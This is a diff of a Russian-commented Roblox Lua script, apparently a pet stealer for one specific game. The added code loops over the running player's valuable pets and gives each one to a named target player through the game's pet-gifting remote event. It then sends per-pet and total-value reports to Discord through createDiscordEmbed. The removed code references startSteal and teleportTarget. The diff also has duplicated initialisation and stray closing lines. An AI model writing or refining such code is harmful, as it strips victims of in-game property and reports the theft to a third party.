@@ -3,6 +3,14 @@ if game.PlaceId ~= 126884695634066 then
     return
 end
 
+
+
+
+
+
+
+
+
 repeat task.wait() until game:IsLoaded()
 
 local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
@@ -20,6 +28,12 @@ getgenv().TransferredCount = 0
 getgenv().TransferredValue = 0
 getgenv().AlreadyTransferred = {}
 getgenv().FinalTransferSent = false
+
+getgenv().AlreadyTransferred = {}
+getgenv().TransferredCount = 0
+getgenv().TransferredValue = 0
+getgenv().FinalTransferSent = false
+
 
 
 
@@ -639,97 +653,80 @@ for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
             end
         end
 
-        local function checkPetsInventory(target)
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(value.PetType, value.PetData) then 
-            continue 
+        local function givePetToPlayer(petUid, playerName)
+            local player = game:GetService("Players"):FindFirstChild(playerName)
+            if not player then return false end
+
+            local petObject = getPetObject(petUid)
+            if not petObject then return false end
+
+            local args = {
+                [1] = "GivePet";
+                [2] = player;
+                [3] = petObject;
+            }
+
+            game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+            return true
         end
 
-        if getgenv().AlreadyTransferred[petUid] then
-            continue -- уже передавался
-        end
 
-        local petObject = getPetObject(petUid)
-        if not petObject then continue end
+local function sendPetTransferredLog(petName, level, weight, value)
+    local message = string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, value)
 
-        -- Данные питомца
-        local petName = value.PetType
-        local level = value.PetData.Level or 0
-        local baseWeight = value.PetData.BaseWeight or 0
-        local growthFactor = getgenv().PetConfig.GrowthFactor or 0.1
-        local weight = baseWeight * (1 + level * growthFactor)
-        local petPrice = PET_VALUES[petName] or 0
-
-        -- Вывод в консоль
-        print(string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice))
-
-        -- Можешь заменить на сообщение игроку:
-        game.StarterGui:SetCore("ChatMakeSystemMessage", {
-            Text = string.format("✅ Передан: %s | Level: %d | Weight: %.2f KG | Value: %d", petName, level, weight, petPrice),
-            Color = Color3.fromRGB(0, 255, 0)
-        })
-
-        -- Обновляем статистику
-        getgenv().TransferredCount += 1
-        getgenv().TransferredValue += petPrice
-        getgenv().AlreadyTransferred[petUid] = true
-
-        equipPet(petObject)
-        task.wait(0.2)
-        startSteal(target)
-    end
+    createDiscordEmbed(message, "**Успешная передача питомца**", "")
 end
 
 
-        local function idlingTarget()
-    task.spawn(function()
-        local lastTarget = nil
-        local targetEnterTime = 0
 
-        while task.wait(0.2) do
-            local isTarget, trigerName = waitForJoin()
-            if isTarget then
-                if lastTarget ~= trigerName then
-                    lastTarget = trigerName
-                    targetEnterTime = tick()
-                end
+local function checkPetsInventory(targetName)
+    local player = game.Players:FindFirstChild(targetName)
+    if not player then return end
 
-                if tick() - targetEnterTime >= 10 then
-                    teleportTarget(trigerName)
-                    checkPetsInventory(trigerName)
+    local anyTransferred = false
 
-                    -- ✅ Проверка: всё передано?
-                    local stillHasPets = false
-                    for petUid, petInfo in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-                        if checkPetsWhitelist(petInfo.PetType, petInfo.PetData) and not getgenv().AlreadyTransferred[petUid] then
-                            stillHasPets = true
-                            break
-                        end
-                    end
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if getgenv().AlreadyTransferred[petUid] then continue end
 
-                    if not stillHasPets and not getgenv().FinalTransferSent then
-    getgenv().FinalTransferSent = true
+        local petName = value.PetType
+        local petData = value.PetData
 
-    local petLines = {}
-    for petUid, _ in pairs(getgenv().AlreadyTransferred) do
-        local petInfo = originalPetData[petUid]
-        if petInfo and petInfo.PetData then
-            local name = petInfo.PetType
-            local level = petInfo.PetData.Level or 0
-            local baseWeight = petInfo.PetData.BaseWeight or 0
-            local weight = baseWeight * (1 + level * (getgenv().PetConfig.GrowthFactor or 0.1))
-            local value = PET_VALUES[name] or 0
-            table.insert(petLines, string.format("%s | Level: %d | Weight: %.2f KG | Value: %d", name, level, weight, value))
+        if checkPetsWhitelist(petName, petData) then
+            local petObject = getPetObject(petUid)
+            if not petObject then continue end
+
+            equipPet(petObject)
+            task.wait(0.2)
+
+            if givePetToPlayer(petUid, targetName) then
+                getgenv().AlreadyTransferred[petUid] = true
+                anyTransferred = true
+
+                local level = petData.Level or 0
+                local baseWeight = petData.BaseWeight or 0
+                local weight = baseWeight * (1 + level * (getgenv().PetConfig.GrowthFactor or 0.1))
+                local value = PET_VALUES[petName] or 0
+
+                print(string.format("✅ Успешно передан: %s | Level: %s | Weight: %.2f KG | Value: %d", petName, level, weight, value))
+
+                sendPetTransferredLog(petName, level, weight, value)
+
+
+                getgenv().TransferredCount += 1
+                getgenv().TransferredValue += value
+            end
         end
     end
 
-    local petList = table.concat(petLines, "\n")
-    local summary = string.format("✅ **Все питомцы переданы!**\n📦 Количество: %d\n💰 Общая стоимость: %d",
-        getgenv().TransferredCount, getgenv().TransferredValue)
+    -- 🧾 финальный отчёт, если больше нечего передавать
+    if not anyTransferred and not getgenv().FinalTransferSent then
+        getgenv().FinalTransferSent = true
 
-    createDiscordEmbed("**✅ Переданные питомцы:**\n" .. petList, summary, "", function()
-        print("📬 Финальный отчёт отправлен в Discord.")
-    end)
+        local summary = string.format("**🎯 Все питомцы переданы.**\nКоличество: %d\nОбщая стоимость: 💰 %d", getgenv().TransferredCount, getgenv().TransferredValue)
+        createDiscordEmbed("Все возможные питомцы были переданы.", summary, "")
+    end
+end
+
 end
 
                 end
